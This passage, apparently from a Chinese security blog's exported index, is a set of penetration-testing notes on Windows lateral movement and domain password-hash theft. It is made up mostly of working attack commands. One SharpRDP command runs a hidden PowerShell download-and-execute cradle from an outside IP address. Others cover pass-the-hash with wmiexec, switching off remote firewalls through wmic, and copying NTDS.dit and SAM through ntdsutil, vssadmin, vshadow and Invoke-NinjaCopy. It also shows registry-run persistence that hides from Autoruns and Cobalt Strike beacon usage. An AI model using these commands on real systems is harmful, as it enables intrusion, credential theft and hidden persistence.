class="line">执行通过任务管理器提升的命令</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe\&quot; </span><br><span class="line">username=domain\user password=password elevated=taskmgr</span><br><span class="line">Add Network Level Authentication</span><br><span class="line">添加网络级身份验证</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe\&quot; </span><br><span class="line">username=domain\user password=password nla=true</span><br><span class="line">  </span><br><span class="line">Ask to take over logon session</span><br><span class="line">要求接管登录会话</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe\&quot; </span><br><span class="line">username=domain\user password=password takeover=true</span><br></pre></td></tr></table></figure><p>注：command为在目标机器上执行的命令<br>如果在目标上启用了受限管理模式，则不要指定任何凭据，它将使用当前用户上下文。<br>可以在 beacon 上 PTH 和 make_token ， windows 系统上 runas &#x2F;netonly</p><h3 id="使用效果"><a href="#使用效果" class="headerlink" title="使用效果"></a>使用效果</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpRDP.exe computername=172.26.2.43 command=&quot;powershell.exe -nop -w hidden -c </span><br><span class="line">\&quot;IEX ((new-object </span><br><span class="line">net.webclient).downloadstring(&#x27;http://139.155.49.43:880/a&#x27;))\&quot;&quot; </span><br><span class="line">username=MINGY\WIN7-1 password=iam8@Mingyue123</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208082050073.png" alt="image-20220808204827813"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208082050987.png" alt="image-20220808204839761"></p><h2 id="impacket套件"><a href="#impacket套件" class="headerlink" title="impacket套件"></a>impacket套件</h2><p>impacket套件是通过445端口进行通信的，不是135端口。</p><ul><li>Windows</li></ul><blockquote><p><a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域用户</span><br><span class="line">wmiexec.exe -hashes :518B98AD4178A53695DC997AA02D455C 域</span><br><span class="line">名/administrator@192.168.3.123 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure><ul><li>Linux</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工作组：</span><br><span class="line">python wmiexec.py -hashes </span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c </span><br><span class="line">administrator@10.10.10.201 &quot;ipconfig&quot;</span><br><span class="line">域用户：</span><br><span class="line">python wmiexec.py -hashes </span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c 域</span><br><span class="line">名/administrator@10.10.10.201 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure><h1 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h1><ul><li>内网防火墙问题~内网可能主机开启了防火墙~~~该怎么办呢？（某些情况下，防火墙会阻止内网主机出网，会影响我们横向移动的时候，对内网其他主机发起请求作正向连接</li></ul><p>使用netsh对防火墙状态进行更改：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看防火墙配置的策略</span><br><span class="line">netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line">#所有网络</span><br><span class="line">打开所有网络防火墙</span><br><span class="line">netsh advfirewall set allprofiles state on</span><br><span class="line">关闭所有网络防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line"></span><br><span class="line">#为当前网络配置防火墙</span><br><span class="line">(与域/专用/公用网络无关)</span><br><span class="line">打开当前网络防火墙</span><br><span class="line">netsh advfirewall set currentprofile state on</span><br><span class="line">关闭当前网络防火墙</span><br><span class="line">netsh advfirewall set currentprofile state off</span><br><span class="line"></span><br><span class="line">#域网络</span><br><span class="line">打开域网络防火墙</span><br><span class="line">netsh advfirewall set domainprofile state on</span><br><span class="line">关闭域网络防火墙</span><br><span class="line">netsh advfirewall set domainprofile state off</span><br><span class="line"></span><br><span class="line">#专用网络</span><br><span class="line">打开专用网络防火墙</span><br><span class="line">netsh advfirewall set privateprofile state on</span><br><span class="line">关闭专用网络防火墙</span><br><span class="line">netsh advfirewall set privateprofile state off</span><br><span class="line"></span><br><span class="line">#公用网络</span><br><span class="line">打开公用网络防火墙</span><br><span class="line">netsh advfirewall set publicprofile state on</span><br><span class="line">关闭公用网络防火墙</span><br><span class="line">netsh advfirewall set publicprofile state off</span><br><span class="line"></span><br><span class="line">#较旧的Windows.版本</span><br><span class="line">XP Server 2003</span><br><span class="line">启用防火墙</span><br><span class="line">netsh firewall set opmode mode=ENABLE</span><br><span class="line">禁用防火墙</span><br><span class="line">netsh firewall set opmode mode=DISABLE</span><br></pre></td></tr></table></figure><ul><li>也是防火墙问题：msf正向连接报错，无法上线session会话时，我们如何关闭对面的防火墙呢</li></ul><p>前提时我们已经获取了该主机的账户密码，可以通过wmic连接上，并执行命令</p><p>关闭完对面的防火墙，就可以msf上线~~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#wmic关闭防火墙</span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process dall create &quot;cmd /c netsh advfirewall set allprofiles state off&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process call create &quot;cmd /c netsh advfirewall set domainprofile state off&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process call create &quot;cmd /c netsh advfirewall set privateprofile state off&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process call create &quot;cmd /c netsh advfirewall set publicprofile state off&quot;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p>基于IPC的横向移动 <a href="https://cloud.tencent.com/developer/article/1691880">https://cloud.tencent.com/developer/article/1691880</a><br><a href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/">域渗透学习（五）基于IPC的远程连接</a><br>Impacket套件之远程命令执行功能讲解 <a href="https://www.sohu.com/a/346196275_257305">https://www.sohu.com/a/346196275_257305</a><br>内网横向移动学习备忘录 - 清风明月&#96;s Blog <a href="https://www.secpulse.com/archives/140140.html">https://www.secpulse.com/archives/140140.html</a><br>SharpRDP - 远程桌面协议控制台应用程序，用于经过身份验证的命令执行 <a href="https://www.mianshigee.com/project/0xthirteen-SharpRDP">https://www.mianshigee.com/project/0xthirteen-SharpRDP</a><br>WMI横向移动<a href="https://blog.csdn.net/lhh134/article/details/104150949">https://blog.csdn.net/lhh134/article/details/104150949</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 横向移动 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x29 - 域内横向移动</title>
      <link href="/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x29-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x29-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<p>在上节所学的内网横向移动的某些内置命令、方法和工具，在域内也是可以用的。通过获取内网主机的凭证去登录其他主机，这种思路是通用的。并且要注意到工作组和域内渗透的不同之处（最大的不同方式应该在于域内的认证方式不同了~）</p><p>域内横向移动主要围绕域认证开始讲解。</p><h1 id="Windows认证机制（见密码凭据获取）"><a href="#Windows认证机制（见密码凭据获取）" class="headerlink" title="Windows认证机制（见密码凭据获取）"></a>Windows认证机制（见密码凭据获取）</h1><p>Windows的认证包括三个部分：</p><ul><li>本地认证：用户直接操作计算机登录账户</li><li>网络认证：远程连接到工作组中的某个设备</li><li>域认证：登陆到域环境中的某个设备</li></ul><h1 id="域内密码凭证获取"><a href="#域内密码凭证获取" class="headerlink" title="域内密码凭证获取"></a>域内密码凭证获取</h1><p>要获取域内所有的凭证，先获取域管权限是最好的</p><h2 id="Ntds-dit活动目录数据库的介绍"><a href="#Ntds-dit活动目录数据库的介绍" class="headerlink" title="Ntds.dit活动目录数据库的介绍"></a>Ntds.dit<strong>活动目录数据库</strong>的介绍</h2><blockquote><p>(也被称为Active Directory database——-AD DS)</p></blockquote><ol><li>域内：</li></ol><p>Ntds.dit 是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中<strong>所有用户</strong>的密码哈希值。为了进一步保护密码哈希值，使用存储在 <strong>SYSTEM 注册表配置单元中的密钥</strong>对这些哈希值进行加密。第二个加密步骤是为了执行<strong>密码转储</strong>以进行审计，所以总共需要两个文件的副本：ntds.dit和system文件。</p><blockquote><ul><li><strong>AD DS由 NTDS.DIT 文件构成，是Active Directory的核心</strong></li><li><strong>默认存储在域控的 %SystemRoot%\NTDS\  文件夹下</strong></li><li><strong>只能通过域控制器进程和协议访问</strong></li></ul></blockquote><ol start="2"><li>工作组中</li></ol><p>另外，在非域环境也就是在工作组环境中，有一个sam文件存储着当前主机用户的密码信息，想要破解sam文件与ntds.dit文件都需要拥有一个system文件（上一节有讲到）。最可靠的执行密码审计的方法是脱机的。</p><ol start="3"><li>获取NTDS.DIT和SAM的内容</li></ol><p>因此我们可以通过获取到这两个文件，然后破解得到其中所存储的密码哈希值。Windows系统为了进一步保护存储的密码哈希值，使用存储在<strong>SYSTEM注册表配置单元中的密钥</strong>对这些哈希值进行加密。因此想要破解SAM文件与NTDS.DIT文件都需要获取一个SYSTEM文件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NTDS.DIT文件位置：%SystemRoot%\NTDS\NTDS.dit</span><br><span class="line">SYSTEM文件位置：%SystemRoot%\System32\config\SYSTEM</span><br><span class="line">SAM文件位置：%SystemRoot%\System32\config\SAM</span><br></pre></td></tr></table></figure><p>由于Window会阻止对这些文件的标准读取或复制操作，如果直接去复制NTDS.DIT文件，会提示文件被系统占用（实际上是被KDC占用），所以常规的复制下载方法是无法获取到文件副本的，因此需要通过特殊方法来获取其副本。获取副本后再用system文件密钥对之解密~~</p><p>接下来就是讲解工具对之利用~</p><h2 id="从Windows中获取NTDS-DIT等敏感文件"><a href="#从Windows中获取NTDS-DIT等敏感文件" class="headerlink" title="从Windows中获取NTDS.DIT等敏感文件"></a>从Windows中获取NTDS.DIT等敏感文件</h2><blockquote><p>下面讲述的方法围绕VSS（Volume Shadow Copy）展开，各种工具都是利用VSS，从中获取敏感文件的副本！！</p></blockquote><h3 id="Volume-Shadow-Copy"><a href="#Volume-Shadow-Copy" class="headerlink" title="Volume Shadow Copy"></a>Volume Shadow Copy</h3><p>Volume Shadow Copy Service  卷影复制服务（VSS）是微软从 Windows XP  开始提供的用于创建一致性的时间点副本（也就是快照）的服务框架。用于更好的备份和还原关键业务数据。当所有组件都支持VSS时，可以使用它们来备份应用程序数据，而无需使应用程序脱机。</p><p><strong>我们可以利用 Volume Shadow Copy Service 来获取 NTDS.DIT、SAM、SYSTEM 等文件副本</strong>。后面讲的一些方法也基本上都是围绕这VSS展开利用</p><blockquote><ul><li>系统内置~~支持 Windows Server 2003  及以上操作系统</li><li>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间无法确定</li><li>禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup</li></ul></blockquote><h4 id="注意备份后留下的痕迹："><a href="#注意备份后留下的痕迹：" class="headerlink" title="注意备份后留下的痕迹："></a>注意备份后留下的痕迹：</h4><ol><li>调用 Volume Shadow Copy 服务会产生SYSTEM日志， Event ID 为7036。</li><li>执行 ntdsutil snapshot “activate instance ntds” create quit quit 会额外产生 Event ID 为 98 的日志</li></ol><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><blockquote><ul><li>获得信息全面：可获得所有用户hash</li><li>简单高效</li><li>无需下载ntds.dit，隐蔽性高</li><li>无需免杀</li></ul></blockquote><h3 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h3><blockquote><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)">ntdsutil官方介绍</a></p><p>官方文档直接Google翻译有点拗口，能懂英文还是直接看英文吧。机翻下来实在头大，还得是自己看原文来的快~~</p></blockquote><p>Ntdsutil.exe是一个命令行工具，它为Active Directory域服务(ADDS)和Active Directory轻型日录服务(AD LDS)提供<strong>管理工具</strong>。ntdsutil命令工具的功能：</p><blockquote><ul><li>ADDS的数据库维护</li><li>管理和控制单个主机操作</li><li>删除域控制器留下的元数据，这些域控制器将会在未卸载的情况下从网络中删除</li></ul></blockquote><p>注意：</p><blockquote><ul><li>域环境默认安装，要使用Ntdsutil.exe,您必须从<strong>管理员命令提示符运行</strong></li><li>如果安装了AD LDS服务器角色但未安装ADDS服务器角色，该怎么办？</li></ul><blockquote><p>则可以使用dsdbutil.exe和dsmgmt,exe命令行工具来执行上述的操作，将会有和ntdsutil.exe一样的效果</p></blockquote></blockquote><p>一般域环境默认安装Ntdsutil.exe</p><blockquote><p>支持系统：</p><ul><li>Server 2003</li><li>Server 2008</li><li>Server 2012</li></ul></blockquote><h4 id="交互式使用"><a href="#交互式使用" class="headerlink" title="交互式使用"></a>交互式使用</h4><ol><li>快照snapshot</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil#进入交互式执行</span><br><span class="line">help#查看哪些可以执行的命令</span><br><span class="line">snapshot</span><br><span class="line">activate instance ntds#激活ntds———设置“NTDS”或特定的AD LDS实例作为活动实例。</span><br><span class="line">create#创建快照，快照内容实际上就是对C盘的备份</span><br><span class="line">mount [GUID]#挂在快照到本地进行使用   GUID是快照ID</span><br><span class="line">接下来就可以使用copy命令下载我们需要的文件！</span><br><span class="line">#copy 完之后再执行</span><br><span class="line">unmout  [GUID]</span><br><span class="line">del [GUID]</span><br></pre></td></tr></table></figure><p>挂载完后我们就可以在里面COPY我们需要的SAM、NTDS.DIT、SYSTEM文件啦~~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451005.png" alt="image-20220804071927342" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451065.png" alt="image-20220804071938619" style="zoom:50%;" /><ol start="2"><li>IFM</li></ol><p>上面的挂载尚显麻烦，我们可以使用更加快的方法IFM~~~~并且主要文件基本上都挂载出来了</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451121.png" alt="image-20220804071949087" style="zoom: 50%;" /><blockquote><ol><li>以管理员身份打开命令提示符（cmd.exe）</li><li>在命令提示符输入 ntdsutil 命令</li><li>在 ntdsutil 提示符下输入</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">activate instance ntds</span><br><span class="line">ifm</span><br><span class="line">create full &lt;Drive&gt;:\&lt;Folder&gt;</span><br><span class="line">#&lt;Drive&gt;:\&lt;Folder&gt; 是要创建文件的文件夹路径。</span><br><span class="line"></span><br><span class="line">可以通过tree /f &lt;Drive&gt;:\&lt;Folder&gt;查看其具体文件  </span><br></pre></td></tr></table></figure></blockquote><h4 id="非交互使用"><a href="#非交互使用" class="headerlink" title="非交互使用"></a>非交互使用</h4><p>实战之中，我们很多时候都拿不到交互式的shell，我们需要使用非交互式的方法去执行相应的命令！~~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</span><br><span class="line">copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br><span class="line">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><h5 id="1-查询当前系统的快照"><a href="#1-查询当前系统的快照" class="headerlink" title="1.查询当前系统的快照"></a>1.查询当前系统的快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br><span class="line">ntdsutil snapshot &quot;List Mounted&quot; quit quit</span><br></pre></td></tr></table></figure><h5 id="2-创建快照"><a href="#2-创建快照" class="headerlink" title="2.创建快照"></a>2.创建快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">guid为 &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;</span><br></pre></td></tr></table></figure><h5 id="3-挂载快照"><a href="#3-挂载快照" class="headerlink" title="3.挂载快照"></a>3.挂载快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>快照挂载为 C:$SNAP_201908291617_VOLUMEC$\</p><h5 id="4-复制ntds-dit"><a href="#4-复制ntds-dit" class="headerlink" title="4.复制ntds.dit"></a>4.复制ntds.dit</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy C:\$SNAP_202008271744_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds2.dit</span><br></pre></td></tr></table></figure><h5 id="5-卸载快照"><a href="#5-卸载快照" class="headerlink" title="5.卸载快照"></a>5.卸载快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot  &quot;unmount &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><h5 id="6-删除快照"><a href="#6-删除快照" class="headerlink" title="6. 删除快照"></a>6. 删除快照</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot  &quot;delete &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><h3 id="Vssadmin"><a href="#Vssadmin" class="headerlink" title="Vssadmin"></a>Vssadmin</h3><blockquote><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754968(v=ws.11)">官方文档</a></p></blockquote><p>vssadmin:卷影复制服务管理命令行工具。域环境默认安装</p><blockquote><p>支持系统：</p><ul><li>Server 2008</li><li>Server 2012</li></ul></blockquote><h4 id="查询当前系统的快照"><a href="#查询当前系统的快照" class="headerlink" title="查询当前系统的快照"></a>查询当前系统的快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure><h4 id="创建快照"><a href="#创建快照" class="headerlink" title="创建快照"></a>创建快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br><span class="line">#/for=c:表示我们对C盘进行卷影备份</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获得 Shadow Copy Volume Name 为 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451964.png" alt="image-20220804072326126" style="zoom:50%;" /><h4 id="查看备份的快照里面的文件"><a href="#查看备份的快照里面的文件" class="headerlink" title="查看备份的快照里面的文件"></a>查看备份的快照里面的文件</h4><p>但是这种奇怪的目录名：<code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10</code>.我们是无法访问的，dir 命令也无法查看。~~~那么这种情况该怎么查看备份的卷影文件里面的文件呢？？通过创建链接的方式~</p><blockquote><ol><li>查看快照列表：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure><ol start="2"><li>无法直接访问 ?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12  中的文件,可通过创建符号链接访问快照中的文件：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mklink /d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\</span><br></pre></td></tr></table></figure><ol start="3"><li>删除符号链接：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rd c:\testvsc</span><br></pre></td></tr></table></figure></blockquote><h4 id="复制ntds-dit"><a href="#复制ntds-dit" class="headerlink" title="复制ntds.dit"></a>复制ntds.dit</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit c:\ntds3.dit</span><br></pre></td></tr></table></figure><h4 id="删除快照"><a href="#删除快照" class="headerlink" title="删除快照"></a>删除快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br><span class="line"></span><br><span class="line">#/quiet为了是避免交互式Y/N选项~~</span><br></pre></td></tr></table></figure><h3 id="Vshadow"><a href="#Vshadow" class="headerlink" title="Vshadow"></a>Vshadow</h3><blockquote><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/vss/vshadow-tool-and-sample">官方文档</a></p></blockquote><p>Vshadow ( vshadow.exe ) 是用于管理卷影副本的命令行实用程序。此工具包含在 Microsoft Windows Software Development Kit (SDK)  中，有 Microsoft 签名。虽然不是内置的工具，但是也是官方的工具~~一定程度上不会引起注意。需要自己上传</p><p>Vshadow 有很多功能，包括执行脚本和调用命令以支持卷影快照管理的能力。</p><h4 id="查询当前系统的快照-1"><a href="#查询当前系统的快照-1" class="headerlink" title="查询当前系统的快照"></a>查询当前系统的快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow.exe -q</span><br></pre></td></tr></table></figure><h4 id="创建快照-1"><a href="#创建快照-1" class="headerlink" title="创建快照"></a>创建快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow.exe -p -nw C:</span><br><span class="line">参数说明：</span><br><span class="line">-p persistent，备份操作或是重启系统不会删除</span><br><span class="line">-nw no writers，用来提高创建速度</span><br><span class="line">C: 对应c盘</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451737.png" alt="image-20220804072600524" style="zoom: 50%;" /><p>获得SnapshotSetID、SnapshotID、Shadow copy device name</p><h4 id="复制ntds-dit-1"><a href="#复制ntds-dit-1" class="headerlink" title="复制ntds.dit"></a>复制ntds.dit</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy [Shadow copy device name]\windows\ntds\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure><h4 id="删除快照-1"><a href="#删除快照-1" class="headerlink" title="删除快照"></a>删除快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow -dx=ShadowCopySetId</span><br><span class="line">vshadow -ds=ShadowCopyId</span><br></pre></td></tr></table></figure><h4 id="利用vshadow执行命令"><a href="#利用vshadow执行命令" class="headerlink" title="利用vshadow执行命令"></a>利用vshadow执行命令</h4><blockquote><p>参考：<a href="https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/">https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/</a></p></blockquote><p>Vshadow.exe  支持 -exec 参数，可用于执行二进制文件（.exe）或脚本（.bat&#x2F;.cmd）。<br>-exec 参数不支持命令参数</p><blockquote><p>要求：</p><ul><li>管理员权限</li><li>上传 Vshadow.exe</li><li>上传攻击载荷</li></ul></blockquote><p>执行命令格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow.exe -nw -exec=&lt;\path\to\exe&gt; &lt;系统驱动器&gt;</span><br><span class="line"></span><br><span class="line">-nw：no writers，用来提高创建速度.允许我们在不调用卷影副本编写器的情况下创建卷影副本，实际上，这是一个非持久性卷影副本，不会留下“物理”磁盘证据</span><br><span class="line">也算一个优点</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:</span><br></pre></td></tr></table></figure><p>成功执行 Vshadow 将启动卷影服务 (VSS)，如系统事件 ID 7036 所示，并调用 VSSVC.exe 进程。<br>执行后，后台存在进程 <strong>VSSVC.exe</strong> ，同时显示服务 Volume Shadow Copy 正在运行，需要手动关闭进程 VSSVC.exe</p><p>注：手动关闭进程 VSSVC.exe 会生成日志 7034。在事件查看器-系统日志中可以看到</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451144.png" alt="image-20220804072844836" style="zoom: 50%;" /><h4 id="自启动持久化和规避"><a href="#自启动持久化和规避" class="headerlink" title="自启动持久化和规避"></a>自启动持久化和规避</h4><p>利用思路：<br>vshadow.exe 包含微软签名，能绕过某些白名单的限制。如果作为启动项，<strong>Autoruns的默认启动列表不显示</strong>！！！</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v VSSBackup /t REG_EXPAND_SZ /d &quot;C:\Program Files (x86)\Windows Kits\10\bin\10.0.16299.0\x64\vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:&quot;</span><br><span class="line">加入注册表，权限维持后面会讲</span><br></pre></td></tr></table></figure><p>在 AutoRuns 中，当过滤“Microsoft Entries”时，我们将看不到我们的登录条目.。但是，如果我们取消选择“Microsoft Entries”并启用“Windows Entries”，我们将看到我们的持久性机制的记录</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451505.png" alt="image-20220804073030521" style="zoom: 33%;" /><h3 id="NinjaCopy（不同于上面几种-推荐）"><a href="#NinjaCopy（不同于上面几种-推荐）" class="headerlink" title="NinjaCopy（不同于上面几种 推荐）"></a>NinjaCopy（不同于上面几种 推荐）</h3><p>使用PowerShell复制NTDs.dit&#x2F;Registry Hives,绕过SACL、DACL、File Locks</p><blockquote><ul><li><a href="https://adsecurity.org/?p=451">攻击者如何从域控制器中提取 Active Directory 数据库 (NTDS.dit)</a></li><li><a href="https://www.cnblogs.com/cdaniu/p/15630284.html">【windows 访问控制】三、访问控制列表 ACL&#x3D;DACL+SACL </a></li><li>在PowerSploit中有许多的powershell脚本供渗透使用~下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinjaCopy.ps1</a></li></ul></blockquote><p>用于获取哈希的技术要么依赖于将代码注入LSASS,要么使用卷影复制服务来获取包含哈希的文件的副本。<br>Invoke-NinjaCopy，一个Powershell脚本，能够通过<strong>获取卷的读取句柄</strong>并解析NTFS来复制NTDs.d1t、注册表配置单元和位于NTFS卷上的任何其他文件。</p><p><strong>操作需要提升到SYSTEM、注入到SYSTEM进程或启动新服务&#x2F;可疑程序</strong></p><p><strong>原理简述：</strong></p><blockquote><p>获取C卷的读取句柄（管理员帐户可以执行此操作），能够读取整个卷的原始字节。然后，解析C卷上的NTFS结构，确定特定文件的字节在卷上的位置，扫描到该位置并复制文件字节。</p></blockquote><blockquote><p>C++编写的NTFS解析器：<a href="http://www.codeproject.com/Articles/81456/An-NTFS-Parser-Lib">http://www.codeproject.com/Articles/81456/An-NTFS-Parser-Lib</a></p><p>将现有的NTFS解析器编译为DLL并将其加载到Invoke-ReflectivePEInjection</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#powershell操作</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">invoke-NinjaCopy</span>.ps1<span class="comment">#导入模块，加载脚本</span></span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> .\sam.hive</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span> .\system.hive</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> <span class="string">&quot;C:\windows\ntds\ntds.dit&quot;</span> <span class="literal">-LocalDestination</span> .\ntds.dit</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#CS上执行powershell操作</span></span><br><span class="line"></span><br><span class="line">beacon&gt; powershell<span class="literal">-import</span> C:\Users\MINGY\Desktop\<span class="built_in">Invoke-NinjaCopy</span>.ps1</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> c:\sam.hive</span><br><span 